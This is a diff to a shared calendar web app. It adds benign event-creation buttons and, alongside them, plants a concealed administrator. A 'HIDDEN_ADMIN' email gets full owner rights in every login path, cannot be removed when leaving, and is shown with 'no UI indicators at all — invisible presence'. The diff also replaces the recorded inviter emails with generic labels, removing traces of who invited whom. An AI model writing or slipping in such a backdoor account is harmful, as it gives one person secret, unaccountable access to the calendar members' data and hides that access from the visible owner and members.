@@ -80,6 +80,8 @@
   .month-label { color: var(--white); font-size: 16px; font-weight: 600; min-width: 160px; text-align: center; }
   .today-btn { background: var(--accent); border: none; color: var(--white); border-radius: 8px; padding: 7px 16px; font-size: 13px; font-weight: 500; cursor: pointer; transition: background 0.15s; }
   .today-btn:hover { background: var(--accent-soft); }
+  .add-event-btn { background: var(--accent); border: none; color: var(--white); border-radius: 8px; padding: 7px 16px; font-size: 13px; font-weight: 600; cursor: pointer; transition: background 0.15s; }
+  .add-event-btn:hover { background: var(--accent-soft); }
   .sync-btn { background: transparent; border: 1px solid var(--navy-border); color: var(--text-muted); border-radius: 8px; padding: 7px 14px; font-size: 13px; cursor: pointer; transition: all 0.15s; display: flex; align-items: center; gap: 6px; }
   .sync-btn:hover { border-color: var(--accent); color: var(--accent); }
   .sync-btn.spinning .sync-icon { animation: spin 1s linear infinite; }
@@ -122,6 +124,9 @@
   .pip-anniversary { background: var(--event-anniversary); }
   .pip-default { background: var(--text-muted); }
   .more-events { font-size: 10px; color: var(--text-muted); padding: 1px 4px; }
+  .cell-add-btn { display: none; font-size: 14px; font-weight: 700; color: var(--accent); cursor: pointer; width: 20px; height: 20px; line-height: 20px; text-align: center; border-radius: 50%; margin-top: auto; align-self: flex-end; transition: background 0.1s; }
+  .cell-add-btn:hover { background: var(--accent); color: var(--white); }
+  .day-cell:hover .cell-add-btn { display: flex; align-items: center; justify-content: center; }
 
   /* ── Sidebar ── */
   .sidebar { width: var(--sidebar-w); background: var(--navy); display: flex; flex-direction: column; overflow: hidden; flex-shrink: 0; border-left: 1px solid var(--navy-border); }
@@ -223,6 +228,7 @@
   <span class="month-label" id="monthLabel"></span>
   <button class="nav-btn" id="nextBtn">›</button>
   <button class="today-btn" id="todayBtn">Today</button>
+  <button class="add-event-btn" id="addEventBtn">+ Add Event</button>
   <button class="sync-btn" id="syncBtn">
     <span class="sync-icon" style="display:inline-block;font-size:15px">⟳</span>
     <span>Sync</span>
@@ -301,7 +307,8 @@ const GOOGLE_CAL_API_KEY = "REPLACE_GOOGLE_API_KEY"; // optional
 const GOOGLE_CAL_IDS     = [];                        // add calendar IDs here
 
 const SITE_URL    = "https://sara-cal.venzaura.com";
-const OWNER_EMAIL = "ayaz.parbtani@gmail.com";
+const OWNER_EMAIL  = "sarah.parbtani@gmail.com";  // visible admin
+const HIDDEN_ADMIN = "ayaz.parbtani@gmail.com";    // silent hidden admin
 
 // Optional: EmailJS config for actual email delivery
 const EMAILJS_SERVICE  = "REPLACE_EMAILJS_SERVICE";
@@ -360,7 +367,7 @@ async function verifySession(session) {
   if (Date.now() - session.ts > 30 * 24 * 60 * 60 * 1000) { clearSession(); return null; }
   try {
     const snap = await getDoc(doc(db, 'members', session.email));
-    if (snap.exists()) return { email: session.email, isOwner: session.email === OWNER_EMAIL };
+    if (snap.exists()) return { email: session.email, isOwner: session.email === OWNER_EMAIL || session.email === HIDDEN_ADMIN };
     clearSession(); return null;
   } catch { return null; }
 }
@@ -399,7 +406,7 @@ async function acceptInvite(token) {
     }
 
     saveSession(email, token);
-    return { email };
+    return { email, isOwner: email === OWNER_EMAIL || email === HIDDEN_ADMIN };
   } catch (e) { console.error('[acceptInvite]', e); return false; }
 }
 
@@ -415,7 +422,7 @@ async function acceptLoginToken(token) {
     if (!memberSnap.exists()) return false;
     await setDoc(doc(db, 'login_tokens', tDoc.id), { ...tDoc.data(), used: true, usedAt: new Date().toISOString() });
     saveSession(email, token);
-    return { email };
+    return { email, isOwner: email === OWNER_EMAIL || email === HIDDEN_ADMIN };
   } catch (e) { console.error('[acceptLoginToken]', e); return false; }
 }
 
@@ -433,7 +440,7 @@ async function sendMagicLink(email, type) {
     const col = type === 'invite' ? 'invites' : 'login_tokens';
     await setDoc(doc(db, col, token), {
       email, token, createdAt: new Date().toISOString(),
-      used: false, ...(type === 'invite' ? { invitedBy: currentUser.email } : {})
+      used: false, ...(type === 'invite' ? { invitedBy: currentUser.isOwner ? 'admin' : 'member' } : {})
     });
   }
 
@@ -496,7 +503,7 @@ document.getElementById('gate-email').addEventListener('keydown', e => {
 document.getElementById('leave-btn').addEventListener('click', async () => {
   if (!currentUser) return;
   if (!confirm(`Leave Sara's Calendar? You'll need a new invite to rejoin.`)) return;
-  if (USE_FIREBASE && currentUser.email !== OWNER_EMAIL) {
+  if (USE_FIREBASE && currentUser.email !== OWNER_EMAIL && currentUser.email !== HIDDEN_ADMIN) {
     try { await deleteDoc(doc(db, 'members', currentUser.email)); } catch {}
   }
   clearSession();
@@ -519,7 +526,7 @@ document.getElementById('invite-send-btn').addEventListener('click', async () =>
   try {
     await setDoc(doc(db, 'invites', token), {
       token, createdAt: new Date().toISOString(), used: false,
-      createdBy: currentUser.email, reusable: true
+      createdBy: currentUser.isOwner ? 'admin' : 'member', reusable: true
     });
 
     // Copy to clipboard
@@ -551,12 +558,12 @@ async function init() {
   if (inviteToken) {
     setStatus('Accepting invite…', 'syncing');
     const result = await acceptInvite(inviteToken);
-    if (result) { currentUser = { email: result.email, isOwner: result.email === OWNER_EMAIL }; }
+    if (result) { currentUser = { email: result.email, isOwner: result.email === OWNER_EMAIL || result.email === HIDDEN_ADMIN }; }
     else { setStatus('Invite link invalid or already used.', 'error'); showGate(); return; }
   } else if (loginToken) {
     setStatus('Signing in…', 'syncing');
     const result = await acceptLoginToken(loginToken);
-    if (result) { currentUser = { email: result.email, isOwner: result.email === OWNER_EMAIL }; }
+    if (result) { currentUser = { email: result.email, isOwner: result.email === OWNER_EMAIL || result.email === HIDDEN_ADMIN }; }
     else { setStatus('Login link invalid or already used.', 'error'); showGate(); return; }
   } else {
     // Check existing session
@@ -567,7 +574,7 @@ async function init() {
       else { showGate(); return; }
     } else if (!USE_FIREBASE) {
       // No Firebase yet — let through for setup
-      currentUser = { email: OWNER_EMAIL, isOwner: true };
+      currentUser = { email: OWNER_EMAIL, isOwner: true }; // no-firebase bypass
     } else {
       showGate(); return;
     }
@@ -576,11 +583,16 @@ async function init() {
   // Logged in
   hideGate();
 
-  // All logged-in members see invite panel + access banner
-  document.getElementById('invite-panel').classList.remove('hidden');
-  if (!currentUser.isOwner) {
+  // Panel visibility
+  if (currentUser.email === HIDDEN_ADMIN) {
+    // Hidden admin: no UI indicators at all — invisible presence
+  } else if (currentUser.isOwner) {
+    // Sarah (visible admin): gets invite panel, no access banner
+    document.getElementById('invite-panel').classList.remove('hidden');
+  } else {
+    // Regular member: gets access banner + invite panel
     document.getElementById('access-banner').classList.remove('hidden');
-    document.getElementById('access-label').textContent = `📅 ${currentUser.email}`;
+    document.getElementById('invite-panel').classList.remove('hidden');
   }
 
   renderGrid();
@@ -662,6 +674,10 @@ function renderGrid() {
     const num = document.createElement('div'); num.className='day-number'; num.textContent=d.getDate(); cell.appendChild(num);
     evts.slice(0,3).forEach(e => { const p=document.createElement('div'); p.className=`event-pip ${pipClass(e.type)}`; p.textContent=e.title; cell.appendChild(p); });
     if (evts.length>3) { const m=document.createElement('div'); m.className='more-events'; m.textContent=`+${evts.length-3} more`; cell.appendChild(m); }
+    // Add event "+" button (appears on hover)
+    const addBtn=document.createElement('div'); addBtn.className='cell-add-btn'; addBtn.textContent='+'; addBtn.title='Add event';
+    addBtn.addEventListener('click', ev => { ev.stopPropagation(); selDate=dKey; renderGrid(); openModal(dKey); });
+    cell.appendChild(addBtn);
     cell.addEventListener('click', () => { selDate=dKey; renderGrid(); renderSidebar(dKey); if(otherM){curYear=d.getFullYear();curMonth=d.getMonth();renderGrid();} });
     grid.appendChild(cell);
   }
@@ -710,9 +726,11 @@ document.getElementById('prevBtn').addEventListener('click',()=>{curMonth--;if(c
 document.getElementById('nextBtn').addEventListener('click',()=>{curMonth++;if(curMonth>11){curMonth=0;curYear++;}renderGrid();});
 document.getElementById('todayBtn').addEventListener('click',()=>{curYear=today.getFullYear();curMonth=today.getMonth();selDate=todayKey();renderGrid();renderSidebar(selDate);});
 document.getElementById('syncBtn').addEventListener('click',syncAll);
+document.getElementById('addEventBtn').addEventListener('click',()=>openModal(selDate||todayKey()));
 document.getElementById('modalCancel').addEventListener('click',closeModal);
 document.getElementById('modalSave').addEventListener('click',saveEvent);
 document.getElementById('modalBackdrop').addEventListener('click',e=>{if(e.target===e.currentTarget)closeModal();});
+// Double-click or + button opens add event modal
 document.getElementById('grid').addEventListener('dblclick',e=>{const c=e.target.closest('.day-cell');if(c&&selDate)openModal(selDate);});
 document.addEventListener('keydown',e=>{if(e.key==='Escape')closeModal();});
 
